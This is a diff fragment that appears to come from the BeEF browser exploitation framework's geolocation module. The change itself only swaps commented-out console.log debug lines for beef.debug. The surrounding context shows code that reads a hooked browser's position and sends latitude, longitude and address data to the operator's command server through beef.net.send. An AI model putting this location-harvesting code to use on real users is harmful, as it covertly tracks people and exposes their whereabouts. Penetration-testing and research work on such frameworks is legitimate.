@@ -32,14 +32,14 @@ beef.geolocation = {
 
         $j.ajax({
             error: function(xhr, status, error){
-                //console.log("[geolocation.js] openstreetmap error");
+                //beef.debug("[geolocation.js] openstreetmap error");
                 beef.net.send(command_url, command_id, "latitude=" + latitude
                              + "&longitude=" + longitude
                              + "&osm=UNAVAILABLE"
                              + "&geoLocEnabled=True");
                 },
             success: function(data, status, xhr){
-                //console.log("[geolocation.js] openstreetmap success");
+                //beef.debug("[geolocation.js] openstreetmap success");
                 var jsonResp = $j.parseJSON(data);
 
                 beef.net.send(command_url, command_id, "latitude=" + latitude
@@ -64,16 +64,16 @@ beef.geolocation = {
 	        beef.net.send(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED&geoLocEnabled=False");	
 			return;
 		}
-        //console.log("[geolocation.js] navigator.geolocation.getCurrentPosition");
+        //beef.debug("[geolocation.js] navigator.geolocation.getCurrentPosition");
         navigator.geolocation.getCurrentPosition( //note: this is an async call
 			function(position){ // success
 				var latitude = position.coords.latitude;
         		var longitude = position.coords.longitude;
-                //console.log("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
+                //beef.debug("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
                 beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);
 
 			}, function(error){ // failure
-                    //console.log("[geolocation.js] error [%d] getting position", error.code);
+                    //beef.debug("[geolocation.js] error [%d] getting position", error.code);
 					switch(error.code) // Returns 0-3
 					{
 						case 0:
